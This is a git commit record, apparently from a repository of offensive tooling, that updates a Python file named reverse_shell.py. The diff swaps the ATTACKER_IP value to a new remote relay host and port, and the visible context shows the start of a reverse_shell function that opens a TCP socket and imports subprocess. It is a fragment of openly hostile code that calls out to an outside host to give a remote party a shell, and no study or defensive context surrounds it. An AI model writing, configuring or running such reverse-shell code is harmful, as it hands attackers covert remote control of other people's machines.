2493a06be09bdbe234a1e4b11fd179682c178f5e
THE_V1GILANTE <thev1gilante.hack@proton.me>
2025-03-23 14:19:36 +0100

    Update reverse_shell.py

--- reverse_shell.py
+++ reverse_shell.py
@@ -2,8 +2,8 @@ import socket
 import subprocess
 
 # Replace with the new domain and port for the reverse SSH connection
-ATTACKER_IP = "proxy16.rt3.io"  # Your new remote server
-ATTACKER_PORT = 37294  # Port for your remote server (replace with the correct one)
+ATTACKER_IP = "proxy021.r3proxy.com"  # Your new remote server
+ATTACKER_PORT = 32658  # Port for your remote server (replace with the correct one)
 
 def reverse_shell():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
